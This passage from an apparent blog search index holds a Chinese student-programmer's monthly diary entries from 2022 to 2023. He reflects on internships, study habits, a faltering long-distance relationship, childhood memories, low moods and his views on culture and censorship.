se、spring、springboot、微服务、分布式等等。我感觉我像是个调包侠，不停的配置、引用，跟神经网络炼丹没啥区别。我生命最宝贵的两个月，就这样悄悄溜走了，没有悲伤，只剩下迷茫。 我很讨厌外教上的学术英语课，坦白说我对这门课毫无学习兴趣，但每周准点到的作业真的是烦人。 我到底该怎么办呢？我只想找份好工作，挣钱买房养我爸妈而已，真的很痛苦。我甚至都没怎么玩游戏，就能把自己生活节奏搞得一团糟。 生活？活着。当然，我知道我没有任何资格发脾气抱怨，所以我还得忍着，我一定要找到好实习。 关于学习，之前考研时总结的应试技巧是反复练习。如今，随着技术点越来越发散，我现在的一般步骤是先上 b 站看是否有好的教学视频，其次是看官网的相关介绍，最后 google 一下相关的博客。还有关于技术书，我感觉写书的人一般为了 “不出错” 都会将技术概念写的大而全，让人很难集中注意力去读下去，简而言之 —— 枯燥。以前我认为是我的水平问题，但现在我却不那么认为。比如说 redis，我真的有必要对 redis 的每个细节都斤斤计较吗，它只是一个数据库罢了，我真正应该考虑的是我会在什么场景使用它，如果我只打算在 spring boot 中嵌入一下，那便无需深入，看看 spring 官网即可。 另一方面是，我对算法信心渐渐无了，或许是太功利的缘故，我无法忍受最近两周都成为两题选手，要知道我一年前就能 ac 三道了。不过，我还是会继续刷下去，刷到 600 题结束。","link":"/2022/04/27/life-diary-22-4/"},{"title":"2022 年 6 月","text":"6 月 8 日晚，在健身房跑步的时候看到一只硕大的苍蝇贴在墙上搓手，我突然想着如果一切都是一场梦，这是不是潜意识在提醒我逃离。我继续殷切地观望着它，然而它依然懒趴趴地，偶尔才很不情愿地扭动了一下。“多不想长大啊。“再次意识到自己仍然是个普通人后，还是难免遗憾。对了，健身房的窗户是闭着的，但我也懒得去打开，也许下次我会试试。 最近很少有写日记，不是因为平常没什么思考或者想法，是因为疫情和同学在一个屋子，日记里的矫情很怕被人审视，究其原因性格使然罢了。","link":"/2022/07/27/life-diary-22-5/"},{"title":"2022 年 8 月","text":"今天揉鼻子时掉落下一根纯白色的鼻毛，联想起之前天天熬夜导致半夜心悸干呕的痛苦经历，我不得不承认自己身体并不好，但没关系，我会慢慢锻炼身体的。 目前实习工作主要用到的是 Golang，大数据开发 Spark 用到的是 scala，同组的其他同事都在用 kotlin 开发后端，我没办法将全部语言学的很好。之前有尝试过深入学习 Golang 但进展很慢，实际回报效果也不是很好，仍处于用啥学啥阶段，计划是跟着《Go 语言编程之旅》做个博客 DEMO 熟悉下基于 Go 的 Web 开发，而未来仍以 Java 为主。 下午开会时，暴雨携雷鸣电闪袭来，连续三个月的酷暑看来终于迎来了谢幕，不知道成都的限电情况能否因此有所缓解。在淘宝买了不少穿的，挑挑拣拣许久也差强人意。色不能艳，衬得人又土又俗，也不能单薄到黑白灰一片，把屌丝气质全显了形，谁让我一米八的个子顶着张平庸的脸呢。当然了，这些衣服除了短袖藏里面外没一件秋天能穿的，所幸旧衣服还能凑合。 本来是打算去食堂吃完晚饭就骑上共享单车兜风减肥，后来上网一查，不少人说骑车不如跑步，可是跑步哪能有骑车惬意，不过最后还是接受了 “骑车只能消消食，减肥还得管住嘴迈开腿” 这一事实。顺带一提，去学校健身房这个行为对我是一种挑战，我总害怕我搁一群高高帅帅的肌肉男里太刺眼了，存在本身在那里就成了一种不和谐。但我也需要明白，我其实并不起眼，每个人都只会关心自己的身体，或者更 “摆烂” 一点，鲜花也需要绿叶去衬托，成为绿叶不正是绝大多数人在绝大多数场景的宿命么。我不想猝死，也想让身体变更健康，所以我去健身房是完全正能量的事情。很抱歉，未来的我，我之所以要用如此多的文字去描述，正是因为我内心有一些无聊的纠结，是理性和感性的对抗，写这段话前我决定了但还有些犹豫，写完后已经不再犹豫了。 思绪如风，我只能尽量去记录。","link":"/2022/09/01/life-diary-22-8/"},{"title":"2022 年 9 月","text":"前段时间心里说不出的苦闷，由于本身在一个 wlb 工作环境中，大家都是嘻嘻哈哈热热闹闹的，但唯独我因为不善表达导致社交困难。哪怕当个不会说话的螺丝钉也就罢了，至少这六个月当好工具人交差跳槽完事，但上上周组长交的任务真把我整破防了。 这项工作是关于通信协议和代理的，对于组长来说应该是小菜一碟，但对我来说真的挑战不小。连续两天零产出后，中间又耽搁一周培训，组长帮我把代码写了一大半，剩下的一点小活也吭哧吭哧花了一周。在工作中，一个人要想站稳，要么社牛，要么大佬。我一个也不是，后面复盘时觉得自己应该努力去表演社牛的，而不是真被 wlb 氛围骗到而选择摆烂暴露自己真实的社交无力。现在好了，连当个优秀工具人都不太够格了。当然我知道，这些都是小问题，我确实可以我行我素到离职，然后呢，下一家公司继续轮回？所以我要总结自己失败的原因，然后改正，目前我还是没什么头绪，只能晚上拼命看学习视频来止损。 内心默念三声，我是计算机高手，未来是计算机大牛！高手会怎么做，大牛会怎么做，毕竟都是人，只是思考角度和熟练度不同罢了。我现在的问题不是能力有限，而是见识不够，解决问题的 “发散网” 还不够丰富，手足无措也很正常，不需要气馁。当然，我的表现也确实足够差劲，大神遇到困难可不会像我一样碎碎念，也就是说我在 “处理问题” 的过程中给别人的印象就是菜鸟卡壳，而不是问题正在被解决。下一次遇到问题，低头冷漠脸地敲字，然后记录问题和思路，可以手扶下巴，但绝不能露出难受、困惑、迷茫和无助等情绪，这是职场，没有朋友会帮你的。 一点流水账：组好新机器后，卖完我在闲鱼上卖掉了旧 cpu、旧电源、airpods pro 和 airpods max，顺带换了 airpods pro 二代，感觉还凑合。之前一头热买的东西都扔掉了或者就一直搁置不管，浪费了很多钱，后悔没有早点用。","link":"/2022/10/03/life-diary-22-9/"},{"title":"2023 年 1 月","text":"文字的张力并不单取决于内容本身，而更多靠着与读者的共鸣。 运气看不见也抓不着，从小听着机会是留给有准备的人长大的我却开始向往躺平，我害怕躺平，一方面是担心周围人的评价，毕竟在中国每个人都需要呆在属于自己的位置，躺平的人放弃了这种价值体系也就会被排斥，另一方面，我骨子里并不认为自己是个一无是处的废物，但我确实不知道应该做些什么来证明自己的价值。尽管我知道这个世界上有太多无所事事的庸人，但我就是没办法用 “总有人躺平，凭什么不能是我” 来搪塞。 今天认识到了一种很新奇的理论，年轻人主动给老人让座，老人反而是恶，这种不争取、渴求怜悯。越是虚弱的人，无力争取自身权利的人就越是邪恶。 人一旦不从事创造，而持续地疯狂汲取他人的作品，就会开始麻木并逐渐染上一种莫名 “优越感”，成为一名空虚的包打听。 我过去曾因被歌曲打动，在网易云留下过一些分享心情的话，很多年过去后，每当我的留言被点赞，我就会替当时 “幼稚的我” 而感到尴尬。但现在觉得，其实说些幼稚的话也没什么，有懵懂少年少女会因生活中的迷茫而对当时的我说的话产生共鸣，我其实也能收获些存在感。 局部最优解往往不是最优解，甚至可能从全局来看是一个很差很差的决定，做人也好做事也好，我除了着眼当下，还要看看远方，且不能草草了事，谨记中国的草台班子就是这么烂下去的。 我追求金钱是为了让生命有质感，追求艺术是为了让生命和世界共鸣。我没法做到原始性的启发，只能借鉴天地自然和艺术家们的作品。 展望新的一年，我给自己定下了三个目标即找到好工作、不延毕和练出肌肉，并培养读好书和结识新朋友的习惯。","link":"/2023/02/06/life-diary-23-1/"},{"title":"2023 年 10 月","text":"这个月同慧琳相识，确切地说应该是上个月。二人由双方家长牵头添了微信。初识并没擦出什么火花，尽管我强忍内心腼腆主动打了招呼，但有一搭没一搭聊着快一个小时后，话题戛然而止。总之，最后谁也不再多说一句话了。 等国庆结束后，慧琳耐不住她妈妈劝，主动跟我打了招呼。我们从各自小时候开始聊起，一直到各自和前任的破碎恋情。我像个拿着盾牌的战士，防御着内心的寂寞和冲动也抵挡着外部的进攻，大部分时间我都沉浸在自己的情绪中， 如果把爱情看成一条河，那么此刻我显然到了彼岸，隔着 1661km 的距离，我好像没有以前那么狂热了。我对她想什么、在做什么，了解欲望不大，但我会主动告诉她我的一些状态，每个人有掌控欲。但与此同时，爱情也让我变得很平庸，我不再思考一些有深度的东西。开始习惯了幼稚，用玩笑糊弄过去真正的问题，而问题是永远不会消失的，它只会延迟爆炸。 但爱情也能拯救一个患有轻微厌世症状的人，我开始重新对生活有了一丝盼头。我嘴巴上一直告诉自己，爱情、婚姻都无法让人生重启，但我却无可救药地相信了这种神话传说。我全心全意地相信着对方的每一句甜言蜜语，我分不清嘲讽、玩笑和喜悦的区别，在我看不到的地方，无数的陷阱已然张牙舞爪。几乎每天早上，浓浓悲观情绪都会将我昨晚火热的心再次浇灭。早安晚安、你好再见，难道悲剧真的会重新上演？我到底做对了什么，又到底做错了什么，没人教我，当感情分扣光后，只剩下灰色的分手，或许附赠一句苍白的临别赠言，好把我的强作镇定砸个稀巴烂。如果可以，我希望今天死去，这样匆匆的欢笑和泪水也不至于慢慢沦落成厌恶和嫌弃。 无数人都告诉我秋招要海投，但我半信半疑中选择了守成，最后落得被美团用一个白菜价戏弄的下场，无缘高薪。失败是肯定会失败的，即使成功率高达 1：1，也会收到 150 封拒绝信。资本收益率也只有 8% 左右，现在有一个 50% 稳定收入回报的机会摆在面前，我肯定要拿住的。 为什么我会觉得耳洞很正常但鼻子舌头不行呢。 当任意一方不再主动聊天时，这种感受是非常明显的，可能是潜意识或者无意识的。我总觉得是时候阻止自己再陷入这场闹剧了，恋爱的 cosplay 总会有开始，有结束。夏天的热闹和喧哗就让它永远停留在夏天，秋风会提醒我，冬天总会到来。我为什么要开始迎合对方说话呢，我为什么不能做我自己呢，我为什么要变得有趣，我就是沉默的幽灵，在雨夜里飘荡晃悠。我失去了什么，我得到了什么，为什么仅仅是短暂的分离也会让我肝肠寸断，大概是不能理解如今对方的心情，失去了控制感和方向。我醉酒着朝着悬崖一路疾驰，风暴开始在心中聚集，粉身碎骨是属于我篇章的终止符。 什么是可爱，一种想要去爱去守护的感觉，什么时候会感受到，不知道。","link":"/2023/11/16/life-diary-23-10/"},{"title":"2023 年 11 月","text":"上海的秋风总爱带着残夏的温度和雨水的潮湿，闷声朝人撞过来。早上醒来后，并没有立刻起床，而是静静躺在床上，望着天花板发呆。最近基本手机不离手，我很喜欢看到 “正在输入中…” 的字样。这意味着世界上有另外一个人关心我的想法，她好奇我的状态，而我不再是一棵可有可无的小草了。 通话之后是良久的沉默，我恐惧再听到感情碎裂的声音，于是努力笨拙地拉扯着一些无聊的话头。很快她看出了端倪，让我没必要这样，只要通话在维系，想到什么再说就好啦。我反而是窘迫和不成熟的一方，我惶恐着逃避但又舍不得挂断电话，于是如此无言僵持了半小时。最后，假装发现没挂断，嘟囔了几句便狼狈逃走。面对喜欢的人，我总是那么自卑、自怜又自傲，我不知道她们到底想要什么，我更不知道自己能不能给她们想要的。她们总是说想要我、想我、爱我，只有我知道，我什么也做不到。 11 月 6 日，上海气温骤降，残夏转深秋。傍晚的空气透着冷意，我心亦是。慧琳说因为父亲的缘故，来不了上海了，觉得太仓促。突然我喉咙被一股无形力量卡住，张了张嘴巴，发不出声音。顿了会儿，收拾好心情，强颜欢笑跟她通话，中途还被未知电话打断两次。我觉得我一直在骗自己，我这算喜欢、爱还是仅仅只是习惯性依赖。我有点厌倦了，这虚假无意义的一切。我想，我最大的问题就是真的爱上了对方，这对彼此都是一种伤害，我是拎不清，她是见着烦。一旦她有了新的玩具，真相告之天下，我就会被弃之如敝履，我为什么看不透这个事实，还在幻想，还在发疯，蠢到把人家的话全部当真了。 小时候，每到盛夏，我母亲会带我到合江门口的岷江岸边游泳。出门前，我将泳圈从衣柜顶兴冲冲取出，而我母亲则会提前顺路买些凉菜，大多数情况是卤鸡爪，偶尔也有鸭脖子、兔头之类。4 点左右到了河边，大大小小蓝色或白色的遮阳伞错落有序地伫立着。交少许摊位费，我们也找了个清净靠河的位置。出门前，我已经换好了泳裤，因此直接脱光衣服存到塑料口袋里，便迫不及待奔到河水里。日落西山时，夕阳能把半条河都染红，天空则一片昏黄，我那会儿看到这景色并无丝毫伤感，就只觉得漂亮。当我玩到手脚指头发白，而河水也不再暖和时，我才会恋恋不舍地裹着毛巾慢慢上岸。风一吹，冷得我直打哆嗦，这才惊觉天早已黑透了。晚上沿着滨江路和母亲边聊边走，有时候我不听话，两人便赌气似的一前一后，不吭声。当然关系和好的时候，我总是有说不完的话，学校里的同学老师，课外书里的故事，自己的憧憬和梦想，对生活的看法还有心情。 心情变更糟糕，虽然除此之外都是好心情，但阴雨绵绵的情绪总是如附骨之蛆如影随形。望着月下水中的云彩，我开始怀念曾经向往的未来。等会儿我要买一听啤酒，醉酒之后是一个人的大雨倾盆。啤酒是苦的，水也是苦的，舌头是苦的，心里是苦的。二楼的窗户是封死的，推不开，也吹不了风。温度很高，但我把衣服裹紧，后背有一点酸涩，脾胃有点痛。 摄影和人眼的区别，摄影会将时空定格，照片上的每一格像素都会被封存。 我太害怕了，我害怕会失去她，但这其实挺好笑，人并不能失去未曾拥有过的东西。我为什么对她着迷，因为只有她说我的好，尽管我知道对这种客套话的迷恋将让我陷入深渊里。","link":"/2023/12/16/life-diary-23-11/"},{"title":"2023 年 2 月","text":"我现在的目标是挣很多很多钱，不惜一切代价找需求找痛点然后达成交易。而越是想挣大钱，越是要处处小心，不要畏惧打工仔身份，先当好一个合格的打工仔，行内事办漂亮，待人接物妥当。当前的想法是先做个淘宝上的资源二手贩子，再写个软件。 手术做完了，手术费捎上前后开销约莫 5k，因为算自我投资也不会考虑回报率，图个展望未来就成。 晚上刷完 b 站视频后，又继续刷知乎，时不时见缝插针在微信群和 QQ 群里瞎叨叨几句，浪费自己生命。我之前很喜欢说只有浪费的时间才是属于自己的，但因为懒惰和拖延一直处于过渡态的浪费并不在其中。刷视频可以增加见闻倒还好，每天在聊天群里沙海淘尽再将自己的心情和精力都耗干在无效讨论中确实没必要，不知道其他人的夜晚是怎么渡过的。 我偶尔会想是不是该将以前读过的书再读一遍，一来现在搜索引擎很发达，Bing 甚至绑定了 chatGPT 这种强 AI 来助力解决问题，没必要通过读书增长见闻，二来我在为人处事这方面功夫确实差人太多，曾经读过的修身道理在该派上用场时却又忘掉大半。 合理评估自己的真实心理需求真不是一件容易的事情，今天看上了飞利浦 279M1RVE，其实 4k 高刷屏于我并非刚需，消费主义总是会让我陷入偏执，但价格会让我好好冷静。 日本的服务业真的是顶级的，一切都是那么称心如意，我希望能在中国将服务业做大做强。 所有看似脆弱的政治结构都是由前人最优秀的智慧结晶所支撑。人们渴求艺术、渴求意义，这无需解释。荷尔蒙和激素可以轻易地替代人的理智。他们需要火，生命之火，来宣泄热情。","link":"/2023/02/27/life-diary-23-2/"},{"title":"2023 年 3 月","text":"我也不知道为什么要写日记，可能害怕多年后的某一天，一切尘埃落定，回顾前半生，才发现我只是一直在跑，忘记了风景和人，自己也成了一道孤零零的鬼魂。童年时乘城乡汽车回老家，车子在烂石头路上磕磕绊绊晃悠个不停，车里各种气味混在一起打开窗也透不过气。一般我上车没到五分钟就头晕想吐，而这样的旅程要持续近两个钟头，就硬生生熬着扛着，直到下车那一刻才敢大口呼吸，一种逃出生天的喜悦涌出心头。 国内的大部分工作都不会让我觉得自己在做一件很酷的事情，而是混口饭吃，无论科技脑力含量多高也感觉自己毫无地位可言，一直在搬砖。现在 AI 越来越发达，不需要任何技巧，一个简单的学习模型加上海量数据和高规模算力，就能得到一个人工智能。那么，我又将要扮演一个什么样的角色呢，或者说我将要去向哪里才有意义呢。我想，唯一的解决办法，就是穿越时间了，我无法改变外界，但我能改变我自己。 大家对国家不再信任了，以往发生什么案子，只要政府蓝贴公告一出，那些喧嚣便逐渐沉寂，现在再没法打消大家的疑虑，反倒是各种阴谋论层出不穷，有人说这是塔西佗陷阱。 我是一个笨人，理解力也不好，但随着听的看的越多，也能清晰感受到中国人的聪明人是非常多的，但为什么要将我们的眼睛蒙上，耳朵堵住呢。我不奇怪自己之前甚至生出了读书无用论这种奇怪的思想，一来我入了思维怪圈凡事都求有用而不是求真求知，二来我不擅长文科，个人思想境界水平太低，又不屑一顾。 我早该明白，我的学习方式不是钻研或者苦命的学习，而是自己动手去探究。我学知识很喜欢将别人已经列好的大纲，然后像初中高中那样将大纲上的知识点挨个扫清，可扫知识点的过程太过乏味，很多知识我实践过程中其实从来没有用到过，而我还是硬着头皮去背，这样效率就会很低。另一方面，我应该多写，具体格式之类的不要太在意，我脑子转的快，后面再将思路整理一下即可，而不是陷入絮絮叨叨的混乱格式整理中。 我受了编程随想的极大感染。 积累的知识，除了用文档形式记录下来，还应该做到能够口述，能将自己的观点以一种铿锵有力的语气有节奏的表达出来。 略闻从解放前到疫情开放这一大段历史之后，过去将来大致有了脉络，但对我个人应该以何种姿态跳入历史中还是茫然不知措。我只能勉强想出三点：个人表达技巧，整理历史政治相关的资料，计算机技术。 读《如何阅读一本书》有感，我们一般称读书叫求知求学，大多数人也仅仅只是停留在获取知识这一最浅显的层面，和看报刷视频本质上没有任何区别。读书更重要的是要提升思维，这个概念最近被营销的厉害，很多人也只是知道有这么一回事儿，具体如何连我也说不太明白但绝不是那些乱七八糟的所谓 “吓你一跳” 的东西。总而言之，我希望这本书能告诉我如何提升自己的思维能力，不再被动读书而是主动掌握一些哪怕是技巧一样的东西。 我现在逛知乎如同逛贴吧，虚假的、毫无理性思考的帖子回答四处乱飞，这并非孤立，审核机制大大打击了人们创作和传播知识的热情。 后面打算看一下《反脆弱》和《思考：快与慢》。","link":"/2023/04/01/life-diary-23-3/"},{"title":"2023 年 4 月","text":"“一流举子二流医，三星四卜五堪舆，唯有相家称第六，七书八画九琴棋。” 给当今社会把把脉，当个 “二流医” 又何妨。 爱国主义是把锋利的刀子，很多人认为它可以用来刺痛外敌，但我总看到它捅向那些发出不整齐声音的同胞。 我反对主流文化，非是对普罗大众生了埋怨，而是我并不觉得当今主流文化能够代表大众。关于这一点，可能需要对 “大多数” 的范畴做一个深入探讨，才能完整表达我的观点，但我今天并不打算继续讨论下去。非要举例的话，生活中那些代表群众的和打着群众旗号的人实在数不胜数，然而那还不够，从制度问题延展而来的文化问题才是更为致命的，二者相互纠缠影响到今天早已分不出谁为因果。 话说回来，我很享受国外以及港台的流行文化，对于美的东西我向来不吝称赞，我并不怕有人嫌我的夸赞太浮夸又或者太内敛，它发自真心。我听周杰伦、邓丽君，看龙珠、游戏王，读金庸、古龙，做任何普通人都爱做的事，我是那个万里挑一中 “一” 之外的大多数。 我不知道大家会不会困惑，普通人的价值观是否有意义？因为尽管在阅读时我常常代入进 “普通人” 这一角色，但在现实中，我却并未这么做。比如乘地铁、逛街时，我将普通人视作随地刷新的 NPC，我不会关心他们在思考什么，更不会好奇他们的表情是痛苦还是喜悦，他们只是我生活背景墙里的大多数们。毕竟，“我” 是能思考的，聪明人也是能思考的，除此之外剩下的那群大多数们处于一种永远存在却也永远不重要的状态。 但主流文化试图代表大多数们，可是他们如我一般只是被动的，被宣传机构和广告自媒体们的话术牵引着消费，调动为数不多的喜怒哀乐去迎合主流文化，并 “成为” 主流文化，再被代表。但现在，我确信我也是大多数的一分子，那我必然反对这种文化控制。它不仅控制我，还代表我，让我找不到人反驳，毕竟我确实会沉迷 “奶头乐” 短视频，也会点击 “震惊” 系新闻。可我还是不想承认自己的浅薄，于是便反对了，拒绝拥抱所谓主流。我不是说每种流行文化都是浅薄的而是说这些文化是披着浅薄这层外衣包裹着流行，再将浅薄这一符号扔过来，让普通人被迫承认。看吧，我甚至无法组织起语言去表达，但我唯一确定的是我感受到了一种欺骗，并且我没法再强行骗自己假装没有这一回事。 作为一个普通人，我不浅薄但是麻木，时刻让思想凌迟，它一点也不痛，但一旦意识到就会觉得心里很空。有时候，悚然惊觉自己正麻木地在人世间浑噩，猛抬头发现前路也是忽明忽暗，心里再琢磨又明白自己主动拥抱麻木的缘由。如此场景反复在我的有限生命里重复上演，我真的有活过吗？ 未曾想过，历史真相竟然也能沉重到让人难以接受，也许是太近了，近到所谓受害者和加害者们都没死光，正与我在同一片蓝天下共呼吸着。于是不由发一声感叹，“这世界不曾可爱过”。但我又能奈何，虚假历史拼凑成的辉煌将那些丑陋的伤疤全盖上，既然看不到、记不得那便全当没曾发生过可好。即使我想和周围人讲，也不知道从何开始说，既害怕嘴上功夫浅薄，其罪恶传递不了三四成，又害怕说的太骇人，徒留恐怖罩着人消磨掉仅存的那点反抗心。迫于文化审查，心底里那更多想法只敢好好藏着掖着，不敢讲与任何人。温读林语堂先生《吾国与吾民》时，发现思维很近，也很受启发。 真正的阻碍是什么呢？阻止我思考，阻止我学习的，是什么？阻止我进步的，是什么？阻止我成为一个完整的人的，是什么？ 我写作是无所谓对错的，只要记录下我此刻认知中的世界，此刻认可的道理，此刻所理解的世界运行轨迹即可。我写作并不需要太过于刨根问底，那样便什么也做不，时间全耗费在无穷无尽的拆穿他人谎言的过程中了。吃饱穿暖这些我是能肉眼看到的，找工作难不难我是能切肤感受到的，我只能对我个人的诚实负责。 我越发觉得，历史是包袱而非底蕴，甚至历史悠久这个词眼看也染上负面情绪，或者怪我最近看多了伴随悠久历史一同流传下来的肮脏东西。人们要提出新的问题，新的方向，而不该一直在旧圈子里转。我们固然可以从历史中获取教训，但更多应该去结合当下的实际去做出明智的决定。 一旦脑子里热血喷涌，我就知道我此刻的决定是不理智的。崇拜历史即恐惧历史，希冀借助崇拜去融入某个群体，隐没起来，是一种逃避现实的行为，是不理智的。 做学问，有三点，一是兴趣，二是才能，三是不忘。 遍观知乎，盛产文字垃圾，人们分不清什么是文章、讨论和评述，也不明白礼貌和文明，只有无穷无尽得不到释放的表达欲，将网页填的满满当当，在文字审查中喧嚣出个一家争鸣。智者稍有不慎，便误陷这文字泥淖，被谩骂攻击。而我并不应当扮演一个喇叭或者回声筒，应该心平气和去探讨可能性，毕竟我需要的是不同的思考视角，而不是 “说服” 本身。我总幻想人人意见与我一致，但这何尝不是另外一种恐怖呢。 在听山下达郎的歌曲时很容易感受到那种时代的悲凉感，什么是时代的悲凉感？太阳变成红巨星吞噬掉地球，昔日的希望之火终将毁灭世界，从此信仰破碎，前路昏暗。 我认为写作有三个难点，第一个也是最难的，提出问题，有时候大脑是一片空白，我完全不知道自己应该想些什么，只是不舒服。第二个难点是回答问题，你可能觉得很奇怪，既然提出问题那么必然会想着回答问题，但事实上尽管能够提出问题并表达出来的人已经少之又少，而这其中想着去回答问题的人又是十之一二。太多人提出了问题，却并不觉得那个问题是问向自己的，或者说并不认为自己有责任去回答。从道义上讲这无可厚非，但既然一切皆是虚妄，去尽量回答一下而不是做个糊裱匠又不会怎样。第三个难点是坚持写，刚开始我写作是全凭着心情吊着的，写作肯定是在乎有没有人看的，但我也知道我的水平不高，糊弄自己还好，拿给众人挑刺难免贻笑大方。后来觉得吧，我如果不写点东西记录下 “此时此刻的我”，日后难免自欺，连青春岁月也被旁人的作品给替换，只在梦里流年忘返。 当然，写作也是需要勤加训练的，来自社会层面的恶意和压迫如吃人不吐骨头的老虎，我日日感受着，但我却很难去用文字表述这种恶。直到我发现，有能人去凝练，譬如 “内卷”、“人矿”，言简意赅，回味无穷。又或者 “养猪场”，开始固然难以接受但经不住细想和对照，最后不得不承认恰如其分。另一方面，即使我本人反感鲁迅，但也不得不承认，他真将文字化作了刀，对着绥靖者们狠狠捅上去。当然，我的老师们很多，完全不用在其生涩的文字里苦熬着。 说到这里，真是不得不感叹一句，写作本来是传播思想、交流思想的，为什么会有人喜欢将文章写得那么难懂呢？我说的难懂，就是指的文字层面而不是思想层面，也就是说当你理解了文章的道理后感觉他说的太复杂，很不近人情，那就是我想抨击的对象了。比如中国大部分的专业书籍，外文书籍也翻译的吭哧瘪肚，读得你抓狂。 你猜对了，我对我的文字感到沮丧，它们无力地零散在我的脑海里，我小心翼翼一点一点拾起来紧紧抱在怀里。但很不凑巧，我又尤其爱读好文章，被人家幽默的流水行文、缜密逻辑、惊人洞察力所折服。 当我低头看向自己的文字时，又如何能不沮丧？慢慢写吧，多写些，写好些。","link":"/2023/05/01/life-diary-23-4/"},{"title":"2023 年 5 月","text":"达尔文的进化论直到今天仍被有些人奉为圭臬，两百年前的进步思想如果仍觉得不过时那显然该淘汰的是持有这种偏见的人本身。我并不关心它在生物学上的争议，而是想批评它代表的哲学观以及政治思想的腐朽。 倘若将一个国家文明看作生物群落，那么根据进化论，新旧王朝的更替代表了文明的进步。但纵观中国历史，秦灭周、金灭宋、元灭金、曹魏灭刘汉、清灭明，我只看到暴力和谎言。直到今天，仍有所谓 “进步” 的战争，“正义” 的战争，纳粹发动二战也说要 “收复” 失地。 人们最喜欢听的就是他们已经知道并认同的，这样的交流并不会传递任何有用的信息，只剩下情绪在狂欢。“是的，正是这样，我早知道！” 如果想对一个人洗脑，你只需要在他面去不断地重复错误的信息即可。 消费，消费，用消费欺骗自己享受着现在的生活，用外在的物质去填充内心。 对马克思主义的认识是从受骗开始的，但后面心空了，觉得无法解决现实问题，甚至无法解释现实。于是开始看儒家、禅宗，后面又了解了西方的启蒙主义、浪漫主义和自由主义。现在只追求念头通达，拒绝彼岸的谎言，也拒绝无意识的思考。 很多苦难如果不亲身经历，哪怕只有一两天，是无法理解的。譬如下工地种庄稼，我只远远瞥过。于我而言他们是戴着安全帽和斗笠的一串影子，顶着太阳佝偻着缓慢游动。毒日头晒不到我，如雨的汗也浇不湿我，投射到我内心的无非是一种抽象的 “苦难”，而这苦难只能用做家务、久坐、超市采购重货去想象。 休谟对因果关系的质疑让我触动很深，实然无法推导应然，一个精通法学的人并不一定遵纪守法，至于老人们喜欢念叨的 “知识越多越反动” 也不成立，哪怕倒过来，根本不相干。 花轮和一与《刑务所之中》 我爱国，质朴的乡土情结促使而成，我希望傍晚沿着我念过小学中学的路散步，我希望周末去游泳过的河边钓鱼，我希望逢年过节不用乘坐高铁飞机而是购买一张巴士车票，一路晃悠到老家，全程一小时多。我听的是我小时候听的流行歌，他们说这是怀旧；我看我小时候爱看的小说，电影和肥皂剧。我多念旧啊，童年也不算快乐，就那么稀松平常的度过了，现在却想偷偷躲回去，住在 08 年的夏天，我们纪念汶川、看奥运，盼着国家变好，手机、电脑越来越神奇，网络上的人海将我淹没，我也甘之如饴。而不像现在，大家都一个样，无聊、迷茫、不知所措，每个人都想要一个模板，就像武功秘籍或者作弊小抄，按着步骤一步步走向成功。可是，没机会了啊，我长大了，知道了、看到了、接受了。就这样也好，反正一天天、一年年，日子就这样转呀转，转到无人的公园。 白天发生了一件小事情，我的新同事问我力扣多少分，我支支吾吾不肯说，想着含糊过去，他嘟囔道指定是 knight 甚至 guardian，我继续含混着说不是很重要。之后他看我刷题刷了不少，问我为什么来美团，我反讥道你咋也来了，他说是签证问题没法工作。于是我找补道，我也没确定日后的正式工作呢，哪怕我连美团转正都不一定打包票。为什么单独拎出来提呢，因为我这连续的对话和为人出事反射出了一个相当不好的信号，心口不一！为什么我说这是一个相当不好的信号，因为我不存在了。真正的我，是心里有一点小自得，我虽然不聪明但也能凭借努力拿个牌子，但是我又怕被人说笨（怕笨应该是童年教育问题），于是想用一些含混地话糊弄过去，别人出于礼貌不再刨根问题，只剩下我自欺。其次，理智告诉我，中国人的人情往来是一种垃圾交流方式，它是一种生存手段而不是社交方法，你要清楚的表达自己的观点！ 即使事后出现问题，那是方式方法的问题，而不是我的问题。 千万千万不要当僵尸，什么话都憋在心里，整天死气沉沉的思考，让疯言疯语关在自己脑袋里。 为什么我的童年是美好的，很大程度是因为我看了很多欧美的儿童动画。 活着的人看《活着》，读完就记得苦，念叨着福贵的好死不如赖活，可毕竟不曾活过，只是在自己编织的谎言里笨拙地适应。 浅野一二 O× 藤子・F・不二雄官方 FANS BOOK「F LIFE 03」- 短篇系列 22《D》 真的一点也不酷，以前我上网全是新玩意、新花样，现在都是一些争吵、情绪宣泄，偶尔我也会被激素绑架上头一下，但终究是觉得 “一点也不酷” 了。 我是肮脏的、丑陋的、阴暗的、邪恶的，自由思想则是光明的、温暖的、美好的、善良的，它如此的好，但又如此的远，我只能感受这美好，却身处泥泞。我该如何？我应该从血与阴暗中厮杀出一条血路，毫不犹豫，勇往直前。只待夜深人静时，一个人静静品味。","link":"/2023/06/04/life-diary-23-5/"},{"title":"2023 年 6 月","text":"每个人能都在走捷径，但什么是捷径，什么又算成功。一个普罗大众眼里的 “成功人士”，一般来说是从小刻苦学习最后成功进入大公司或者公务员，然后便戛然而止。为什么成功者需要由失败者们去认可。“走开，挡着我晒太阳了” 大众不理解，皇帝也不理解。 幸福是什么我搞不明白，但我知道我的痛苦一大半来自脑中世界和现实世界的失衡。显然我现在的能力还无法改变世界，那么只能加深对世界的理解或者改变之前的看法。一种较为实际的解决方法是搞极端，即使心存疑虑，行为和言语也应该义无反顾，注意，仅限于决策层面。譬如打定主意存钱，那便一分一厘也要数清。 除了科学层面，我们连人文社交也是一向喜欢模糊处理，“你懂的”“意思意思”，这种中庸之道为庸人所推崇并将其视作一种修养。其实，我也能理解，凡事都太清楚太讲究，残酷的社会一下子扑到脸前，就太痛苦了。但是现代社会，我会更深入去思考，我与他者们之间的真实关系。继而对道德观也产生了兴趣，传统美德是一种因循蹈矩，只有一个模糊的影子给你抄，各自凭心意去猜。而每当发生冲突，大伙又闹哄哄吵成一团，最后还是采用最野蛮的少数服从多数原则。虽然我们计算机常常使用这种 “少数服从多数” 原则，那是因为点与点之间是真正平等的，而且即使有不平等的因素，比如位置、算力、带宽等，也是可以量化的。但人怎么量化呢，聪明、愚笨、富有、贫穷，皆是天生，各自际遇有千差万别，于是又开始思考论平等。既然无法做到绝对平等，那么自然转向过程平等，虽然这个名词最近又被滥用导致有点污名化，但至少能够实操了。政治一向是这么复杂的，从哲学出发，围绕法律、经济、军事。什么才是好的管理机构，这里我拒绝用高效或高级之类的形容词，单纯用一个好。 现在感觉每一天都过的无比漫长但等快睡觉的时候，又开始长吁短叹，生活将我慢性谋杀。 【油管大神】国外 200 万收藏的编程代码教程（Code Aesthetic），让你的编程能力突飞猛进，提高代码效率（中英字幕） 新加坡如何利用科学的城市设计保持清凉的居住环境 